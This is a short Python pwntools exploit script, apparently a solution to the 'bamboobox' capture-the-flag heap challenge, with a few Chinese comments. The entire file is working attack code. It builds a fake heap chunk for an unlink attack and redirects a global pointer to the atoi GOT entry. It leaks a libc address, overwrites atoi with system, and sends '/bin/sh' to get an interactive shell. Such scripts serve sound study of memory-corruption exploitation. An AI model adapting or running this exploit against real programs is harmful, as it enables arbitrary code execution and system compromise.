#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *




# r = process("./bamboobox",env={"LD_PRELOAD": "./libc-2.23.so"})
# libca =ELF("./libc-2.23.so")
r = process("./bamboobox") if sys.argv[1] == "l" else remote("127.0.0.1", 9999)
elf = ELF("./bamboobox")
libca = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(r)
def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def show():
    r.recvuntil(":")
    r.sendline("1")

additem(0x40,"a"*8)
additem(0x80,"b"*8)
additem(0x40,"c"*8)
pause()
ptr = 0x6020c8
fake_chunk = p64(0) #prev_size
fake_chunk += p64(0x41) #size
fake_chunk += p64(ptr-0x18) #fd
fake_chunk += p64(ptr-0x10) #bk
fake_chunk += b"c"*0x20
fake_chunk += p64(0x40)
fake_chunk += p64(0x90)
modify(0,0x80,fake_chunk)
remove(1)
payload = p64(0)*2
# payload += p64(0x40) + p64(0x602068)
payload += p64(0x40) + p64(elf.got["atoi"])#获得got表项地址
modify(0,0x80,payload)
show()
r.recvuntil("0 : ")
atoi = u64(r.recvuntil(":")[:6].ljust(8,b"\x00"))
print(hex(atoi))
libc = atoi - libca.symbols["atoi"] #拿到偏移
print("libc:",hex(libc))
system = libc + libca.symbols["system"]
modify(0,0x8,p64(system))
r.sendlineafter(":", b"/bin/sh\0")
r.interactive()
r.close()
